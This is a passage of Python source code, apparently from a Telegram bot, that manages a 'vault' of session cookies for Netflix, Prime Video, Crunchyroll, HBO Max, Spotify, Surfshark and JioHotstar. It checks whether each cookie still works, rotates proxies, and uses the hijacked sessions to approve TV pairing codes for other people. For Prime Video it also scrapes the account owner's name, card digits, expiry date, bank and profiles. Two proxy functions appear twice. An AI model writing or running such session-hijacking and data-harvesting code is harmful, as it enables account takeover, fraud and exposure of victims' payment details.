            if "=" in chunk:
                k, v = chunk.split("=", 1)
                if k.strip():
                    ck[k.strip()] = v.strip().strip('"\'')
        if ck:
            return ck
    return ck

def primevideo_build_cookie_header(cookies_dict: dict) -> str:
    pairs = []
    for k, v in cookies_dict.items():
        ak = re.sub(r"-main-av$", "-main", k)
        pairs.extend([f"{ak}={v}"] + ([f"{k}={v}"] if ak != k else []))
    return "; ".join(pairs)

def primevideo_validate_cookie(cookies_dict: dict, proxy: dict = None) -> tuple[str, str, str, dict]:
    """Validates Amazon Prime Video session live via Prime form."""
    if not any(k in cookies_dict for k in ("at-main", "at-main-av", "session-token")):
        return "dead", None, None, None

    ck_hdr = primevideo_build_cookie_header(cookies_dict)
    hdrs = {**PV_HDRS, "Cookie": ck_hdr}
    try:
        r = requests.get(AMZ_CBL_URL, headers=hdrs, proxies=proxy, allow_redirects=False, timeout=10)
        if r.status_code == 200 and ("cbl-input-code-form" in r.text or "cbl-registration-field" in r.text):
            return "active", "US", "Prime Video", {"cookies": cookies_dict}
        if r.status_code in (301, 302, 307) and "signin" in r.headers.get("Location", ""):
            return "dead", None, None, None
        return "network_error", None, None, None
    except Exception:
        return "network_error", None, None, None

def primevideo_fetch_subscription_details(cookies_dict: dict, proxy: dict = None) -> dict:
    """Introspects Prime Video account tier, territory, card details, and profiles."""
    lc = cookies_dict.get("lc-main-av") or cookies_dict.get("lc-main") or "en_US"
    info = {
        "valid": False,
        "plan": "Prime Video",
        "country": lc.split("_")[-1].upper() if "_" in lc else "US",
        "account_name": None,
        "payment_method": None,
        "card_bank": None,
        "subscription_id": None,
        "profiles": None,
        "ubid": cookies_dict.get("ubid-main-av") or cookies_dict.get("ubid-main") or "Unknown",
        "is_subscribed": False,
    }
    try:
        ck_hdr = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())
        r = requests.get(
            "https://www.primevideo.com/settings/your-account",
            headers={**PV_HDRS, "Cookie": ck_hdr},
            proxies=proxy,
            allow_redirects=False,
            timeout=12,
        )
        if r.status_code in (301, 302, 303, 307, 308) and "/region/" in r.headers.get("Location", ""):
            loc = r.headers.get("Location", "")
            target_url = loc if loc.startswith("http") else f"https://www.primevideo.com{loc}"
            r = requests.get(target_url, headers={**PV_HDRS, "Cookie": ck_hdr}, proxies=proxy, allow_redirects=False, timeout=12)
        if r.status_code == 200:
            t, info["valid"] = r.text, True
            c_m = re.search(r'"recordTerritory":\s*"([^"]+)"', t)
            plan_m = re.search(r'"header":\s*\{\s*"title":\s*\{[^}]*"string":\s*"([^"]+)"', t)
            sub_m = re.search(r'subscriptionId=([A-Z0-9]+)', t)
            bank_m = re.search(r'"name":\s*\{\s*"dvString":\s*\{\s*"attrs":\s*\{\},\s*"string":\s*"([^"]+)"', t)
            if c_m: info["country"] = c_m.group(1).upper()
            if bank_m: info["card_bank"] = bank_m.group(1)
            if sub_m: info["subscription_id"] = sub_m.group(1)
            info["plan"] = plan_m.group(1) if plan_m else ("Amazon Prime" if "Amazon Prime" in t else "Prime Video")
            card_m = re.search(r'"paymentMethodNumber":\s*\{\s*"prefix":\s*"([^"]*)",\s*"lastDigits":\s*"([^"]*)"\s*\}', t)
            hdr_m = re.search(r'"paymentMethodHeader":\s*"([^"]+)"', t)
            exp_m = re.search(r'"paymentMethodExpirationDate":\s*\{\s*"year":\s*(\d+),\s*"month":\s*(\d+)\s*\}', t)
            if card_m:
                info["payment_method"] = f"{hdr_m.group(1) if hdr_m else 'Card'} •••• {card_m.group(2)}{f' (Exp: {exp_m.group(2)}/{exp_m.group(1)})' if exp_m else ''}"
            else:
                sc = re.search(r'(?:se terminant par|ending in|terminada en)\s*(\d+)', t, re.I)
                if sc: info["payment_method"] = f"Card •••• {sc.group(1)}"
            profs = re.findall(r'"profileName":\s*"([^"]+)"', t) + re.findall(r'data-testid="pv-nav-change-profile-[^"]*"\s+aria-label="([^"]+)"', t)
            if profs: info["profiles"] = ", ".join(dict.fromkeys(profs))
            nm = re.search(r'"customerName":\s*"([^"]+)"', t) or re.search(r'(?:Bienvenido|Bienvenue|Hello|Hola|Hallo|Welcome)[,\s]+([A-Za-z0-9\s]{2,30})', t)
            if nm: info["account_name"] = nm.group(1).strip()
            info["is_subscribed"] = bool(info["subscription_id"] or info["payment_method"])
    except Exception:
        pass
    return info

def primevideo_submit_tv_code(cookies_dict: dict, tv_code: str, proxy: dict = None) -> dict:
    """Executes Amazon Prime Video Smart TV Pairing."""
    from urllib.parse import urlparse, parse_qs
    code = re.sub(r"[^A-Za-z0-9]", "", tv_code or "").upper().strip()
    if len(code) != 6:
        return {"success": False, "error": "Invalid TV code format! Enter 6 alphanumeric characters from your TV screen."}

    s = requests.Session()
    if proxy:
        s.proxies = proxy
    ck_hdr = primevideo_build_cookie_header(cookies_dict)
    hdrs = {**PV_HDRS, "Cookie": ck_hdr}

    try:
        r = s.get(AMZ_CBL_URL, headers=hdrs, allow_redirects=False, timeout=10)
    except Exception as e:
        return {"success": False, "error": f"Failed to reach Amazon server: {e}"}

    if r.status_code in (301, 302) and "signin" in r.headers.get("Location", ""):
        return {"success": False, "error": "dead_cookie"}
    if r.status_code != 200:
        return {"success": False, "error": f"Failed to load page (HTTP {r.status_code})"}

    csrf_m = re.search(r"name=['\"]csrfToken['\"][^>]*value=['\"]([^'\"]+)['\"]", r.text, re.I)
    if not csrf_m:
        return {"success": False, "error": "dead_cookie"}

    lang_m = re.search(r"name=['\"]language['\"][^>]*value=['\"]([^'\"]+)['\"]", r.text, re.I)
    for k, v in s.cookies.get_dict().items():
        ck_hdr += f"; {k}={v}"

    post_hdrs = {
        **hdrs,
        "Cookie": ck_hdr,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.amazon.com",
        "Referer": AMZ_CBL_URL,
    }

    try:
        pr = s.post(
            AMZ_CBL_URL,
            data={"csrfToken": csrf_m.group(1), "cbl-code": code, "language": lang_m.group(1) if lang_m else "en_US"},
            headers=post_hdrs,
            allow_redirects=False,
            timeout=12,
        )
    except Exception as e:
        return {"success": False, "error": f"Failed to submit code to Amazon: {e}"}

    loc = pr.headers.get("Location", "")
    st = parse_qs(urlparse(loc).query).get("cbl-status", [""])[0]

    if any(k in loc or k in st for k in ("success", "successfully_authorized")):
        return {"success": True, "device": "Smart TV"}

    if "/a/code/info" in loc:
        try:
            ir = s.get(loc if loc.startswith("http") else f"https://www.amazon.com{loc}", headers=hdrs, timeout=10)
            dev_m = re.search(r'<div class="a-column a-span9 a-span-last">\s*([^<]+)\s*</div>', ir.text, re.I)
            app_csrf = (re.search(r'name=[\'"]csrfToken[\'"]\s+value=[\'"]([^\'"]+)[\'"]', ir.text, re.I) or csrf_m).group(1)
            ar = s.post(
                "https://www.amazon.com/a/code/info/approve",
                data={"cbl-code": code, "csrfToken": app_csrf},
                headers={**post_hdrs, "Referer": loc},
                allow_redirects=False,
                timeout=12,
            )
            aloc = ar.headers.get("Location", "")
            ast = parse_qs(urlparse(aloc).query).get("cbl-status", [""])[0]
            if any(k in aloc or k in ast for k in ("success", "successfully_authorized")) or ar.status_code == 200:
                return {"success": True, "device": dev_m.group(1).strip() if dev_m else "Smart TV"}
            return {"success": False, "error": f"TV device authorization was rejected by Amazon ({ast or aloc})"}
        except Exception as e:
            return {"success": False, "error": f"Failed during confirmation step: {e}"}

    if "invalid_code" in st or "invalid_code" in loc:
        return {"success": False, "error": "Invalid or expired TV code"}

    if "/ap/signin" in loc:
        return {"success": False, "error": "dead_cookie"}

    if pr.status_code == 200 and any(k in pr.text for k in ("success", "Connected", "Connecté")):
        return {"success": True, "device": "Smart TV"}

    return {"success": False, "error": "TV authorization unsuccessful."}




class ProxyEntry(dict):
    """Proxy dictionary compatible with requests/cloudscraper, with metadata for country and raw line."""
    def __init__(self, http_url, https_url=None, country=None, raw_line=None):
        https_url = https_url or http_url
        super().__init__({"http": http_url, "https": https_url})
        self.country = (country or "").upper()
        self.raw_line = raw_line or ""


PROXY_COUNTRY_CACHE = {}


def extract_country_tag(line):
    """Extracts country code from line comment/tag or proxy credentials."""
    # 1. Trailing or tag e.g. #IN, [IN], |IN, :IN
    tag_m = re.search(r'(?:[#|\[\s]|:(?=[A-Za-z]{2}$))([A-Za-z]{2,5})[\]\s]*$', line)
    if tag_m:
        tag = tag_m.group(1).upper()
        if tag in ("IN", "INDIA"):
            return "IN"
        if tag in ("US", "USA"):
            return "US"
        if tag in ("GB", "UK"):
            return "GB"
        if len(tag) == 2:
            return tag
    # 2. Check credentials or host for country markers e.g. -country-in, region-in, cc-in
    m = re.search(r'[-_](?:country|region|zone|cc)[-_=]([a-zA-Z]{2})\b', line, re.I)
    if m:
        return m.group(1).upper()
    return None


def parse_proxy_line(line):
    orig_line = line.strip()
    if not orig_line or orig_line.startswith("#"):
        return None

    country_tag = extract_country_tag(orig_line)

    # Clean trailing tags
    clean_line = re.sub(r'\s*[#|\[].*$', '', orig_line).strip()

    # Handle 5-part colon format: host:port:user:pass:IN
    parts = clean_line.split(":")
    if len(parts) == 5 and len(parts[4]) == 2 and not parts[4].isdigit():
        country_tag = country_tag or parts[4].upper()
        clean_line = ":".join(parts[:4])

    clean_line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", clean_line)
    clean_line = re.sub(r"\s+", " ", clean_line).strip()

    res = None
    m = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", clean_line, re.IGNORECASE)
    if m:
        d = m.groupdict()
        host = d["host"].strip().strip("[]")
        url = f"{d['scheme']}://{d['user']}:{d['password']}@{host}:{d['port']}" if d.get("user") else f"{d['scheme']}://{host}:{d['port']}"
        res = (url, url)
    if not res:
        m = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>[^:\s]+):(?P<port>\d+)$", clean_line)
        if m:
            d = m.groupdict()
            u = f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
            res = (u, u)
    if not res:
        m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", clean_line)
        if m:
            d = m.groupdict()
            u = f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
            res = (u, u)
    if not res:
        m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)$", clean_line)
        if m:
            d = m.groupdict()
            u = f"http://{d['host']}:{d['port']}"
            res = (u, u)
    if not res:
        parts = clean_line.split(":")
        if len(parts) == 4:
            a, b, c, d = parts
            if b.isdigit() and not d.isdigit():
                u = f"http://{c}:{d}@{a}:{b}"
                res = (u, u)
            elif d.isdigit() and not b.isdigit():
                u = f"http://{a}:{b}@{c}:{d}"
                res = (u, u)
    if not res:
        for sep in (r"\s+", r"\|", r";", r","):
            m = re.match(rf"^(?P<host>[^:\s]+):(?P<port>\d+){sep}(?P<user>[^:\s]+):(?P<password>\S+)$", clean_line)
            if m:
                d = m.groupdict()
                u = f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
                res = (u, u)
                break

    if res:
        return ProxyEntry(res[0], res[1], country=country_tag, raw_line=orig_line)
    return None


def get_proxy_country(p):
    """Returns detected country code ('IN', 'US', etc.) or 'UNKNOWN'."""
    if hasattr(p, 'country') and p.country:
        return p.country
    url_key = p.get("http", "")
    if url_key in PROXY_COUNTRY_CACHE:
        return PROXY_COUNTRY_CACHE[url_key]
    return "UNKNOWN"


def resolve_proxy_country(p):
    """Actively queries ip-api to resolve proxy location and saves to cache."""
    global PROXY_COUNTRY_CACHE
    url_key = p.get("http", "")
    if url_key in PROXY_COUNTRY_CACHE and PROXY_COUNTRY_CACHE[url_key] != "UNKNOWN":
        return PROXY_COUNTRY_CACHE[url_key]
    try:
        r = requests.get("http://ip-api.com/json", proxies=p, timeout=5, verify=False)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                cc = (data.get("countryCode") or "").upper()
                if cc:
                    if hasattr(p, 'country'):
                        p.country = cc
                    PROXY_COUNTRY_CACHE[url_key] = cc
                    if 'db' in globals() and db is not None:
                        try:
                            db.set_setting("proxy_country_cache", PROXY_COUNTRY_CACHE)
                        except Exception:
                            pass
                    return cc
    except Exception:
        pass
    return "UNKNOWN"


def load_proxies():
    global PROXY_COUNTRY_CACHE
    if 'db' in globals() and db is not None:
        try:
            cached = db.get_setting("proxy_country_cache", {})
            if isinstance(cached, dict):
                PROXY_COUNTRY_CACHE.update(cached)
        except Exception:
            pass
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_proxy_line(line)
                if p:
                    if not p.country:
                        url_key = p.get("http", "")
                        if url_key in PROXY_COUNTRY_CACHE:
                            p.country = PROXY_COUNTRY_CACHE[url_key]
                    proxies.append(p)
    return proxies



def resolve_proxy_country(p):
    """Actively queries ip-api to resolve proxy location and saves to cache."""
    global PROXY_COUNTRY_CACHE
    url_key = p.get("http", "")
    if url_key in PROXY_COUNTRY_CACHE and PROXY_COUNTRY_CACHE[url_key] != "UNKNOWN":
        return PROXY_COUNTRY_CACHE[url_key]
    try:
        r = requests.get("http://ip-api.com/json", proxies=p, timeout=5, verify=False)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                cc = (data.get("countryCode") or "").upper()
                if cc:
                    if hasattr(p, 'country'):
                        p.country = cc
                    PROXY_COUNTRY_CACHE[url_key] = cc
                    if 'db' in globals() and db is not None:
                        try:
                            db.set_setting("proxy_country_cache", PROXY_COUNTRY_CACHE)
                        except Exception:
                            pass
                    return cc
    except Exception:
        pass
    return "UNKNOWN"


def load_proxies():
    global PROXY_COUNTRY_CACHE
    if 'db' in globals() and db is not None:
        try:
            cached = db.get_setting("proxy_country_cache", {})
            if isinstance(cached, dict):
                PROXY_COUNTRY_CACHE.update(cached)
        except Exception:
            pass
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_proxy_line(line)
                if p:
                    if not p.country:
                        url_key = p.get("http", "")
                        if url_key in PROXY_COUNTRY_CACHE:
                            p.country = PROXY_COUNTRY_CACHE[url_key]
                    proxies.append(p)
    return proxies


def get_service_proxies(service):
    """
    Dedicated Proxy Routing:
    - 'jiohotstar' & 'crunchyroll': Indian (IN) residential proxies reserved & prioritized.
      Fallback to working proxies if no IN proxy configured.
    - All other services (netflix, hbomax, surfshark, spotify, etc.): Leave on SAME server IP (no proxy).
    """
    global proxies_list
    if not proxies_list:
        return []

    if service in ("jiohotstar", "crunchyroll"):
        # Save & reserve Indian residential proxies specifically for JioHotstar and Crunchyroll
        in_proxies = [p for p in proxies_list if get_proxy_country(p) == "IN"]
        if not in_proxies:
            for p in proxies_list:
                if get_proxy_country(p) == "UNKNOWN":
                    cc = resolve_proxy_country(p)
                    if cc == "IN":
                        in_proxies.append(p)
        if in_proxies:
            return in_proxies
        # Fallback to general proxies if no specific IN proxy exists
        return proxies_list

    else:
        # Leave all other services on SAME server IP (no proxy used)
        return []


def get_raw_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    try:
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
    except:
        return []

def save_proxies_to_file(raw_lines):
    try:
        with open(PROXY_FILE, "w", encoding="utf-8") as f:
            for line in raw_lines:
                f.write(line + "\n")
        return True
    except:
        return False

def check_single_proxy(proxy_dict):
    try:
        r = requests.get("https://httpbin.org/ip", proxies=proxy_dict, timeout=5, verify=False)
        return r.status_code == 200
    except:
        return False

def check_proxy_with_region(proxy_dict):
    try:
        r = requests.get("http://ip-api.com/json", proxies=proxy_dict, timeout=6, verify=False)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                cc = data.get("countryCode", "").upper()
                cname = data.get("country", "")
                url_key = proxy_dict.get("http", "")
                if url_key and cc:
                    PROXY_COUNTRY_CACHE[url_key] = cc
                return True, cc, cname
    except:
        pass
    if check_single_proxy(proxy_dict):
        return True, "UNKNOWN", "Unknown Region"
    return False, None, None

proxies_list = load_proxies()


def _auto_extract_vault_zips(service_dir):
    """Auto-extract any .zip files sitting in a vault dir — prevents the 'exhausted' ghost bug
    where valid cookies are trapped inside an unextracted zip. Extracts then nukes the zip."""
    try:
        zips = [f for f in os.listdir(service_dir) if f.lower().endswith(".zip")]
        for zname in zips:
            zpath = os.path.join(service_dir, zname)
            try:
                with zipfile.ZipFile(zpath, 'r') as zf:
                    for name in zf.namelist():
                        if name.endswith('/') or name.startswith('__MACOSX') or name.startswith('.'):
                            continue
                        if not name.lower().endswith(('.txt', '.json')):
                            continue
                        content = zf.read(name).decode('utf-8', errors='ignore')
                        if not content.strip():
                            continue
                        base = os.path.basename(name)
                        safe_name = re.sub(r'[<>:"/\\|?*]', '_', base)
                        dest = os.path.join(service_dir, safe_name)
                        if os.path.exists(dest):
                            suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                            name_part, ext = os.path.splitext(safe_name)
                            dest = os.path.join(service_dir, f"{name_part}_{suffix}{ext}")
                        with open(dest, 'w', encoding='utf-8') as f:
                            f.write(content)
                # Zip extracted successfully — yeet it so we don't re-extract next time
                os.remove(zpath)
            except Exception:
                pass  # Corrupt zip? skip it, don't crash the whole flow
    except Exception:
        pass


def get_vault_cookies(service):
    service_dir = os.path.join(COOKIES_DIR, service)
    if not os.path.exists(service_dir):
        return []
    # Auto-extract any zip files that got dropped in here without /upload
    _auto_extract_vault_zips(service_dir)
    return [f for f in os.listdir(service_dir) if f.lower().endswith((".txt", ".json"))]



def count_vault_cookies(service):
    return len(get_vault_cookies(service))


def clear_vault_cookies(service=None):
    deleted_count = 0
    if service == "all":
        services_to_clear = SUPPORTED_SERVICES
    elif service in SUPPORTED_SERVICES:
        services_to_clear = [service]
    else:
        services_to_clear = []

    with cookie_lock:
        for s in services_to_clear:
            service_dir = os.path.join(COOKIES_DIR, s)
            if os.path.exists(service_dir):
                for f in os.listdir(service_dir):
                    if f.lower().endswith((".txt", ".json")):
                        try:
                            os.remove(os.path.join(service_dir, f))
                            deleted_count += 1
                        except:
                            pass
    return deleted_count


def make_delete_vault_keyboard():
    keyboard = []
    service_emojis = {
        "netflix": "🔴",
        "crunchyroll": "🟠",
        "hbomax": "🟣",
        "surfshark": "🦈",
        "spotify": "🟢",
        "jiohotstar": "🔵",
        "primevideo": "🎬"
    }
    for s in SUPPORTED_SERVICES:
        c_count = count_vault_cookies(s)
        emoji = service_emojis.get(s, "🍪")
        keyboard.append([
            btn(
                text=f"{emoji} {s.upper()} ({c_count} cookies)",
                callback_data=f"admin_delvault_prompt:{s}",
                style="primary"
            )
        ])
    
    total_cookies = sum(count_vault_cookies(s) for s in SUPPORTED_SERVICES)
    keyboard.append([
        btn(
            text=f"⚠️ Delete ALL Vaults ({total_cookies} cookies)",
            callback_data="admin_delvault_prompt:all",
            style="danger"
        )
    ])
    keyboard.append([
        btn(text="🔙 Back to Admin Panel", callback_data="menu_admin", style="primary")
    ])
    return InlineKeyboardMarkup(keyboard)


def get_random_cookie_file(service):
    service_dir = os.path.join(COOKIES_DIR, service)
    with cookie_lock:
        files = get_vault_cookies(service)
        if not files:
            return None, None, None
        filename = random.choice(files)
        filepath = os.path.join(service_dir, filename)
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            return filename, filepath, content
        except:
            return None, None, None



BRAILLE_FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
DOTS_FRAMES = ["", ".", "..", "..."]


async def animate_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, stop_event: asyncio.Event):
    frame_idx = 0
    while not stop_event.is_set():
        frame = BRAILLE_FRAMES[frame_idx % len(BRAILLE_FRAMES)]
        dots = DOTS_FRAMES[(frame_idx // len(BRAILLE_FRAMES)) % len(DOTS_FRAMES)]
        if stop_event.is_set():
            break
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame} Processing cookie verification{dots}\n\nPlease wait...",
            )
        except Exception:
            pass
        frame_idx += 1

def process_tv_login_service(service, tv_code):
    proxies = get_service_proxies(service)

    max_attempts = min(50, max(count_vault_cookies(service), 50))
    attempts = 0

    while attempts < max_attempts:
        attempts += 1

        filename, filepath, content = get_random_cookie_file(service)
        if not filename or not content:
            return {"success": False, "error": "no_cookies"}

        proxy = random.choice(proxies) if proxies else None

        if service == "crunchyroll":
            cookies = crunchyroll_parse_cookie_content(content)
            if not cookies:
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            status, country, plan, auth_data = crunchyroll_validate_cookie(cookies, proxy)
            if status == "dead":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            elif status == "network_error":
                continue
            working_proxy = auth_data.get("working_proxy", proxy) if auth_data else proxy
            result = crunchyroll_submit_tv_code(auth_data, tv_code, working_proxy)
            if result.get("error") == "dead_cookie":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            result["country"] = country
            result["plan"] = plan
            result["email"] = auth_data.get("email", "N/A")
            result["cookie_file"] = filename

            if result.get("success") and db.get_setting("cookie_removal_mode", "dead_only") == "delete_on_success":
                try:
                    os.remove(filepath)
                except:
                    pass

            return result

        elif service == "netflix":
            cookies = netflix_extract_cookie_dict(content)
            if not cookies:
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            status, country, plan, email = netflix_validate_cookie(cookies, proxy)
            if status == "dead":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            elif status == "network_error":
                continue
            result = netflix_submit_tv_code(cookies, tv_code, proxy)
            if result.get("error") == "dead_cookie":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue

            if (not email or email == "N/A") and filename:
                fn_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', filename)
                if fn_match:
                    email = fn_match.group(1)

            result["country"] = country
            result["plan"] = plan
            result["email"] = email
            result["cookie_file"] = filename

            if result.get("success") and db.get_setting("cookie_removal_mode", "dead_only") == "delete_on_success":
                try:
                    os.remove(filepath)
                except:
                    pass

            return result

        elif service == "hbomax":
            st_token = hbomax_extract_st_token(content)
            if not st_token:
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            status, country, plan, auth_data = hbomax_validate_cookie(st_token, proxy)
            if status == "dead":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            elif status == "network_error":
                continue
            result = hbomax_submit_tv_code(auth_data, tv_code, proxy)
            if result.get("error") == "dead_cookie":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            result["country"] = country
            result["plan"] = plan
            result["email"] = auth_data.get("email", "N/A")
            result["cookie_file"] = filename

            if result.get("success") and db.get_setting("cookie_removal_mode", "dead_only") == "delete_on_success":
                try:
                    os.remove(filepath)
                except:
                    pass

            return result

        elif service == "surfshark":
            cookies = surfshark_parse_cookie_content(content)
            if not cookies:
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            status, country, plan, auth_data = surfshark_validate_cookie(cookies, proxy)
            if status == "dead":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            elif status == "network_error":
                continue
            result = surfshark_submit_tv_code(auth_data, tv_code, proxy)
            if result.get("error") == "dead_cookie":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            result["country"] = country
            result["plan"] = plan
            result["email"] = auth_data.get("email", "N/A")
            result["cookie_file"] = filename

            if result.get("success") and db.get_setting("cookie_removal_mode", "dead_only") == "delete_on_success":
                try:
                    os.remove(filepath)
                except:
                    pass

            return result

        elif service == "spotify":
            cookies = spotify_parse_cookie_content(content)
            if not cookies:
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            status, country, plan, auth_data = spotify_validate_cookie(cookies, proxy)
            if status == "dead":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            elif status == "network_error":
                continue
            result = spotify_submit_tv_code(auth_data, tv_code, proxy)
            if result.get("error") == "dead_cookie":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            result["country"] = country
            result["plan"] = plan
            result["email"] = auth_data.get("email", "N/A")
            result["cookie_file"] = filename
            if "tv_name" in result:
                result["tv_name"] = result["tv_name"]

            if result.get("success") and db.get_setting("cookie_removal_mode", "dead_only") == "delete_on_success":
                try:
                    os.remove(filepath)
                except:
                    pass

            return result

        elif service == "jiohotstar":
            parsed = jiohotstar_parse_cookie_content(content)
            if not parsed:
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            
            usage_count = db.get_cookie_usage(filename)
            if usage_count >= 3:
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
                
            status, country, plan, auth_data = jiohotstar_validate_cookie(parsed, proxy)
            if status == "dead":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
            elif status == "network_error":
                continue
                
            result = jiohotstar_submit_tv_code(auth_data, tv_code, proxy)
            if result.get("error") == "dead_cookie":
                try:
                    os.remove(filepath)
                except:
                    pass
                continue
                
            if result.get("success"):
                new_usage = db.increment_cookie_usage(filename)
                if new_usage >= 3 or db.get_setting("cookie_removal_mode", "dead_only") == "delete_on_success":
                    try:
                        os.remove(filepath)
                    except:
                        pass
            else:
                return result
                
            result["country"] = country or "India 🇮🇳"
            result["plan"] = plan or "Hotstar VIP"
            result["email"] = auth_data.get("email") or auth_data.get("phone") or filename.replace('.txt', '')
            result["cookie_file"] = filename
            return result

        elif service == "primevideo":
            cookies = primevideo_parse_cookie_content(content)
            if not cookies:
                try:
                    os.remove(filepath)
                except Exception:
                    pass
                continue

            status, country, plan, auth_data = primevideo_validate_cookie(cookies, proxy)
            if status == "dead":
                try:
                    os.remove(filepath)
                except Exception:
                    pass
                continue
            elif status == "network_error":
                continue

            result = primevideo_submit_tv_code(cookies, tv_code, proxy)
            if result.get("error") == "dead_cookie":
                try:
                    os.remove(filepath)
                except Exception:
                    pass
                continue

            if not result.get("success"):
                return result

            # Fetch account subscription metadata on successful pairing
            det = primevideo_fetch_subscription_details(cookies, proxy)
            result["country"] = det.get("country") or country or "US"
            result["plan"] = det.get("plan") or plan or "Prime Video"
            result["email"] = det.get("account_name") or det.get("ubid") or filename.replace('.txt', '')
            result["cookie_file"] = filename
            if det.get("payment_method"):
                result["payment_method"] = det.get("payment_method")
            if det.get("profiles"):
                result["profiles"] = det.get("profiles")

            if db.get_setting("cookie_removal_mode", "dead_only") == "delete_on_success":
                try:
                    os.remove(filepath)
                except Exception:
                    pass

            return result

    return {"success": False, "error": "all_dead"}

